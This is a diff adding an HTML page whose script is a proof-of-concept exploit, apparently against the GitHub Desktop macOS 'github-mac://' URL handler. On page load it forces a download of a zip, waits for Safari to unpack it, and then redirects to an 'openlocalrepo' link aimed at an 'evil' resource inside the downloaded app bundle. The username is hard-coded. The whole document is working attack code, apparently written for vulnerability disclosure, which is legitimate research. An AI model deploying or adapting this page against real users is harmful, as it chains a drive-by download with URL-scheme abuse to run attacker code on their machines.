@@ -1,0 +1,24 @@
+<body>
+    <script>
+        // "safari" scenario assumes that we know the username
+        // if you think this condition is beyond attacker's capabilities
+        // go to SMB scenario
+        let USERNAME = "metnew"
+
+        function download() {
+            let a = document.createElement("a")
+            a.href= "safari.zip"
+            a.click()
+        }
+
+        window.onload = () => {
+            alert("Do you want to see the perfect (Safari) PoC?")
+            download()
+            // wait a bit... let Safari unpack the archive
+            setTimeout(() => {
+                alert("Click 'Yes' on the next window for PoC")
+                location.href = `github-mac://openlocalrepo//Users/${USERNAME}/Downloads/SafariPoC.app/Contents/Resources/evil`
+            },2000)
+        }
+    </script>
+</body>
